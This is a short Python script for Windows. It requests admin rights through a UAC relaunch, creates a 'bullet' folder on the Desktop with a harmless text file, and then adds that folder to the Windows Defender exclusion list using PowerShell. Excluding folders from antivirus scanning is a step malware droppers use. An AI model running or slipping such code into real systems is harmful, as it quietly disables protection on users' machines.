import os
import ctypes
import subprocess
import sys  # Import the sys module

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def create_bullet_folder():
    # Get the path to the user's desktop
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

    # Create the folder named 'bullet'
    folder_path = os.path.join(desktop_path, "bullet")
    os.makedirs(folder_path, exist_ok=True)

    # Create a text file inside the 'bullet' folder
    file_path = os.path.join(folder_path, "message.txt")
    with open(file_path, "w") as file:
        file.write("hello 123")

    print(f"Folder and file created at: {folder_path}")
    return folder_path

def add_to_defender_exclusions(folder_path):
    try:
        # Add the folder to Windows Defender exclusions
        command = f'powershell -Command "Add-MpPreference -ExclusionPath \'{folder_path}\'"'
        subprocess.run(command, shell=True, check=True)
        print(f"Added {folder_path} to Windows Defender exclusions.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to add exclusion: {e}")

if __name__ == "__main__":
    if not is_admin():
        # Re-run the script with admin privileges
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    else:
        folder_path = create_bullet_folder()
        add_to_defender_exclusions(folder_path)
